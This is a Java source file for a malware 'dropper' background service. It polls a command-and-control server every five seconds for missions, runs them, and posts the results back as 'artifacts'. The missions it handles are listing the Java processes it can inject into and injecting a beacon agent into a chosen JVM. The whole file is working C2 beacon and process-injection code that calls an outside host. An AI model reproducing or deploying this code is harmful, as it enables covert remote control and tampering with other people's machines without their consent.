package dropper.services;

import com.google.gson.Gson;
import dropper.entities.Agent;
import dropper.entities.Artifact;
import dropper.entities.Mission;
import dropper.entities.MissionType;
import dropper.injector.JarInjector;

import java.io.IOException;

import static dropper.utils.HttpUtil.sendGET;
import static dropper.utils.HttpUtil.sendPOST;

public class DropperBackgroundService {
    private final static Gson gson = new Gson();
    private JarInjector injector;

    public DropperBackgroundService() {
        injector = new JarInjector();
    }

    public void listen(String c2Url, Agent agent) {
        String response;
        while (true) {
            try {
                response = sendGET(c2Url + "/nextMission?agentId=" + agent.getId());
                Mission currentMission = gson.fromJson(response, Mission.class);
                if (currentMission != null) {
                    String artifactContent = "no matching action";
                    if (currentMission.getType() == MissionType.SHOW_JVMS) {
                        artifactContent = gson.toJson(injector.getInjectableJars());
                    }
                    if (currentMission.getType() == MissionType.INJECT_BEACON) {
                        artifactContent = gson.toJson(injector.injectAgentToJar(currentMission.getArgs()[0], currentMission.getArgs()[1]));
                    }

                    Artifact artifact = new Artifact(artifactContent, currentMission.getId(), agent.getId());
                    sendPOST(c2Url + "/artifacts", gson.toJson(artifact));
                }
            } catch (IOException e) {
                System.out.println("IO 42");
            }

            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                System.out.println("Int 48");
            }
        }
    }
}
